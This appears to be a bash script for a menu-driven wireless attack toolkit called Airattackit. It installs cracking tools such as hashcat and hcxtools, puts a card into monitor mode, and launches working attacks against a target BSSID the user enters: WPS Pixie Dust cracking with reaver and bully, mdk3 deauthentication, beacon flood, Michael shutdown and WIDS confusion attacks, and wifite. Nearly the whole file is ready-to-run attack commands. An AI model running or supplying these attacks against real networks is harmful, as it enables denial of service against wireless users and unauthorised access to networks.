#!/bin/bash
#Author
#Joyghosh<joychondroghosh@gmail.com>
#https://github.com/JoyGhoshs/Airattackit
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
clear
echo -ne '                    ------------------AIRATTACKIT-------------------------------\r'
sleep 1.5
echo -ne '                    -----------Automated----Simple---Attack-Framework----------\r'
sleep 1.5
echo -ne '                     -----------------By JoyGhosh--------------------------------\r'
sleep 1.5

echo -ne '\n'
function main_menu() {
	while :; do
		clear
		echo -ne "\033]0;Airattackit(By JoyGhosh)\007"
		resize -s 31 100
		clear

		echo -e """ ${red}
********************************************************************************
                     Automated Wirless Attack Toolkit
********************************************************************************
 █████╗ ██╗██████╗  █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗██╗████████╗    
██╔══██╗██║██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██║╚══██╔══╝    
███████║██║██████╔╝███████║   ██║      ██║   ███████║██║     █████╔╝ ██║   ██║       
██╔══██║██║██╔══██╗██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██║   ██║       
██║  ██║██║██║  ██║██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗██║   ██║       
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝  
********************************************************************************
                            From JoyGhosh
********************************************************************************
"""
		echo -e """ ${yellow}
________________________________________________________________________________
        (if Your Card Is In Manged Mode Turn On Monitor Mode Before Any Attack)
                      pack.)Install basic package
                       mon.)Put WirelessCard In Monitor Mode
                       man.)Put Wireless Card In Managed Mode
                         r.)Install Requierd Tools
                         e.)Exit
--------------------------------------------------------------------------------
     1.PixleDust Attack(Rever)
     2.PixleDust Attack(Bully)
     3.Micale Shutdown Attack(mdk3)
     4.Wifite(automated Attack FrameWork)
     5.WIDS/WIPS Confusion Attack(mdk3)
     6.Beacon Flood(mdk3)
     7.Deauthentication Attack(mdk3)
"""
		read -p "AirAttackit>: " option
		case "$option" in
		pack)
			clear
			File=/bin/xterm
			apt-get install xterm hashcat hcxtools hcxdumptool -y
			echo -e "\032[41mReay to open the new terminal!\032[0m"
			if [ ! -f $File ]; then
				echo -e "\033[41mThis shell command was not found and is being installed!\033[0m"
			#arch: pacman -S xterm
			#Kali:apt-get install xterm -y

			else
				echo -e "\033[41mThis command exists ands writes to the configuration file!\033[0m"
			fi
			echo "Write to configuration file!"
			#Non garbled character configuration file writing
			cd /root
			touch .Xresources
			cat >.Xresources <<EOF
XTerm*faceNameDoublesize: Microsoft YaHei:antialias=True:pixelsize=14
xterm*foreground:rgb:b2/b2/b2
xterm*background:rgb:08/08/08
xterm*faceName: DejaVu Sans Mono:antialias=True:pixelsize=14
EOF
			echo "Update configuration!!"
			sleep 3s
			xrdb ~/.Xresources
			echo "Start up terminal!"
			xterm -T " update-terminal " -geometry 100x30 -e " apt-get update  "
			clear
			;;
		mon)
			clear
			read -p "Enter Interface Name>: " i
			airmon-ng start $i
			read -p "press any key to return ..."
			clear
			;;
		man)
			clear
			read -p "Enter Interface Name>: " i
			airmon-ng stop $i
			read -p "press any key to return ..."
			clear
			;;
		1)
			clear
			read -p "Enter Interface Name>: " i
			gnome-terminal -- wash -i $i
			read -p "Enter Bssid Of Target Network>: " bssid
			read -p "Enter Channle Of Target Network>: " c
			xterm -hold -T "Pixle-WPS(Reaver)" -e "reaver -i $i -b $bssid -c $c -vvv -K 1 -f"
			;;
		2)
			clear
			read -p "Enter Interface Name>: " i
			gnome-terminal -- wash -i $i
			read -p "Enter Bssid Of Target Network>: " bssid
			read -p "Enter Channle Of Target Network>: " c
			xterm -hold -T "Pixle-WPS(Bully)" -e "bully -b $bssid $i -c $c -d -v 3"
			;;
		3)
			clear
			read -p "Enter Interface Name>: " i
			gnome-terminal -- airodump-ng $i
			read -p "Enter Bssid Of Target Network>: " bssid
			xterm -hold -T "Micale ShutdownAttack(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i m -t $bssid"
			echo "Attack Is Running./././././././"
			;;
		4)
			clear
			xterm -hold -T "Wifite Automated Attack" -e "wifite"
			;;
		5)
			clear
			read -p "Enter Interface Name>: " i
			gnome-terminal -- airodump-ng $i
			read -p "Enter Bssid Of Target Network>: " bssid
			read -p "Enter essid Of Target Network>: " ssid
			xterm -hold -T "WIDS/WIPS Confusion Attack(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i w -t $bssid -e $ssid"
			echo "Attack Is Running./././././././"
			;;

		6)
			clear
			read -p "Enter Interface Name>: " i
			gnome-terminal -- airodump-ng $i
			read -p "Enter Bssid Of Target Network>: " bssid
			xterm -hold -T "Becon Flood(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i b $bssid"
			echo "Attack Is Running./././././././"
			;;
		7)
			clear
			read -p "Enter Interface Name>: " i
			gnome-terminal -- airodump-ng $i
			read -p "Enter Bssid Of Target Network>: " bssid
			xterm -hold -T "Deauth Attack(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i d $bssid"
			echo "Attack Is Running./././././././"
			;;

		r)
			clear

			;;
		e)
			exit
			;;

		esac

	done

}

main_menu
